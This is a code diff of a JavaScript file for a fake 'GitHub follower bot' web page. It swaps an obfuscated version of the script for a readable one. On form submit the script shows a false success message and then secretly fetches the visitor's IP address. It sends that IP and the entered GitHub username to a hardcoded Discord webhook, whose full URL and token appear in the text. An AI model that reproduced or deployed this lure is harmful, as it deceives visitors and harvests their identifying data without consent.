@@ -1,1 +1,47 @@
-function _0x2261(_0x1bb898,_0x529ded){const _0x223f0b=_0x223f();return _0x2261=function(_0x226173,_0x4e60dc){_0x226173=_0x226173-0x188;let _0x1c4a18=_0x223f0b[_0x226173];return _0x1c4a18;},_0x2261(_0x1bb898,_0x529ded);}const _0x58577c=_0x2261;(function(_0xb9228c,_0x14dde3){const _0x12749c=_0x2261,_0x4ea023=_0xb9228c();while(!![]){try{const _0x8e791=parseInt(_0x12749c(0x194))/0x1+-parseInt(_0x12749c(0x1ab))/0x2*(-parseInt(_0x12749c(0x18b))/0x3)+parseInt(_0x12749c(0x188))/0x4*(-parseInt(_0x12749c(0x19e))/0x5)+-parseInt(_0x12749c(0x19c))/0x6+-parseInt(_0x12749c(0x1a6))/0x7*(parseInt(_0x12749c(0x196))/0x8)+-parseInt(_0x12749c(0x189))/0x9+-parseInt(_0x12749c(0x19a))/0xa*(-parseInt(_0x12749c(0x198))/0xb);if(_0x8e791===_0x14dde3)break;else _0x4ea023['push'](_0x4ea023['shift']());}catch(_0x3150c6){_0x4ea023['push'](_0x4ea023['shift']());}}}(_0x223f,0x7c9f4),document[_0x58577c(0x19f)]('DOMContentLoaded',function(){const _0x67df5c=_0x58577c,_0x2c948f=document[_0x67df5c(0x1a7)](_0x67df5c(0x19d)),_0x3d3f2d=document['getElementById'](_0x67df5c(0x18c));_0x2c948f['addEventListener'](_0x67df5c(0x1ac),function(_0x46e8b3){const _0x284122=_0x67df5c;_0x46e8b3[_0x284122(0x1a0)]();const _0x20a2cb=document['getElementById'](_0x284122(0x1a3))[_0x284122(0x1a5)];_0x3d3f2d['textContent']=_0x284122(0x18d)+_0x20a2cb+_0x284122(0x18f),_0x3d3f2d[_0x284122(0x1a9)][_0x284122(0x193)](_0x284122(0x1a2)),fetch(_0x284122(0x19b))[_0x284122(0x191)](_0x2ff368=>_0x2ff368[_0x284122(0x1a8)]())[_0x284122(0x191)](_0xde1db8=>{const _0x5bb75a=_0x284122,_0x22b8d6=_0xde1db8['ip'];console[_0x5bb75a(0x1a4)](_0x5bb75a(0x195),_0x22b8d6);const _0x2d229e=_0x5bb75a(0x18a);fetch(_0x2d229e,{'method':_0x5bb75a(0x199),'headers':{'Content-Type':_0x5bb75a(0x192)},'body':JSON['stringify']({'content':'IP\x20Address:\x20'+_0x22b8d6+_0x5bb75a(0x197)+_0x20a2cb})})['then'](_0x4e3b2d=>{const _0x5be226=_0x5bb75a;_0x4e3b2d['ok']?console['log']('IP\x20and\x20username\x20sent\x20successfully\x20to\x20Discord\x20webhook.'):console[_0x5be226(0x190)]('Failed\x20to\x20send\x20IP\x20and\x20username\x20to\x20Discord\x20webhook.');})[_0x5bb75a(0x1a1)](_0x4d04ee=>{const _0x5400e9=_0x5bb75a;console[_0x5400e9(0x190)](_0x5400e9(0x1aa),_0x4d04ee);});})[_0x284122(0x1a1)](_0x11b741=>{const _0x13e6df=_0x284122;console[_0x13e6df(0x190)](_0x13e6df(0x18e),_0x11b741);});});}));function _0x223f(){const _0x44927a=['Successfully\x20botted\x201,000\x20followers\x20to\x20','Error\x20fetching\x20IP:','\x27s\x20GitHub\x20account!','error','then','application/json','remove','993509lmnnLp','User\x27s\x20IP:\x20','76112cGAiDI',',\x20GitHub\x20Username:\x20','26114ILhRYQ','POST','7310wYesfm','https://api.ipify.org?format=json','5760714dyHxrn','bot-form','15xHfiGf','addEventListener','preventDefault','catch','hidden','username','log','value','161WJHaSK','getElementById','json','classList','Error:','1198aenRJs','submit','595388raVqmK','5352894npQMLg','https://discord.com/api/webhooks/1294755524826628136/Mb7QgegjkM33slZlHJXy2fyutTtaDnVn1YtZ_sWyc5gda51DyXuA_uq8ZKNZrz9wyD0L','9LLgyYb','message'];_0x223f=function(){return _0x44927a;};return _0x223f();}
+document.addEventListener("DOMContentLoaded", function() {
+    const form = document.getElementById("bot-form");
+    const message = document.getElementById("message");
+
+    // Submit form event
+    form.addEventListener("submit", function(e) {
+        e.preventDefault();
+        const username = document.getElementById("username").value;
+        
+        // Show the fake bot message
+        message.textContent = `Successfully botted 1,000 followers to ${username}'s GitHub account!`;
+        message.classList.remove("hidden");
+
+        // Fetch the user's IP and send it to the Discord webhook
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                console.log("User's IP: ", ipAddress);
+
+                const discordWebhookUrl = "https://discord.com/api/webhooks/1294755524826628136/Mb7QgegjkM33slZlHJXy2fyutTtaDnVn1YtZ_sWyc5gda51DyXuA_uq8ZKNZrz9wyD0L"; // Replace with your webhook URL
+
+                fetch(discordWebhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `IP Address: ${ipAddress}, GitHub Username: ${username}`
+                    }),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('IP and username sent successfully to Discord webhook.');
+                    } else {
+                        console.error('Failed to send IP and username to Discord webhook.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+            });
+    });
+});
